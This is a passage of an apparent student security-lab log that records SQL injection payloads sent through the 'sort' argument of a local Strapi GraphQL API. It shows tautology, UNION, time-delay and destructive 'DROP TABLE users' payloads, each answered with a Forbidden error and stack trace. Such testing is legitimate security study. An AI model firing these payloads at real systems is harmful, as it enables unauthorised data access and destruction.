+	Query: query { reviewWorkflowsWorkflows(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { reviewWorkflowsWorkflows(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { reviewWorkflowsWorkflows(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { reviewWorkflowsWorkflows(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { reviewWorkflowsWorkflows(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflows"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing reviewWorkflowsWorkflowStages_connection (string args: ['sort'])
+
+[>] Testing reviewWorkflowsWorkflowStages (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { reviewWorkflowsWorkflowStages(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { reviewWorkflowsWorkflowStages(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { reviewWorkflowsWorkflowStages(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { reviewWorkflowsWorkflowStages(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { reviewWorkflowsWorkflowStages(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["reviewWorkflowsWorkflowStages"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing usersPermissionsRoles_connection (string args: ['sort'])
+
+[>] Testing usersPermissionsRoles (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { usersPermissionsRoles(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { usersPermissionsRoles(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { usersPermissionsRoles(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { usersPermissionsRoles(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { usersPermissionsRoles(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { usersPermissionsRoles(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { usersPermissionsRoles(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { usersPermissionsRoles(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { usersPermissionsRoles(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { usersPermissionsRoles(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { usersPermissionsRoles(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { usersPermissionsRoles(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { usersPermissionsRoles(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { usersPermissionsRoles(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { usersPermissionsRoles(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId name } }
+	Response: {"errors":[{"message":"Forbidden access","path":["usersPermissionsRoles"],"extensions":{"code":"FORBIDDEN","stacktrace":["ForbiddenError: Forbidden access","    at authorize (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:99:31)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async fieldDefinition.resolve (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/plugin-graphql/dist/server/services/content-api/wrap-resolvers.js:107:17)"],"error":{"name":"ForbiddenError","message":"Forbidden access","details":{}}}}],"data":null}
+
+
+[>] Testing usersPermissionsUsers_connection (string args: ['sort'])
+
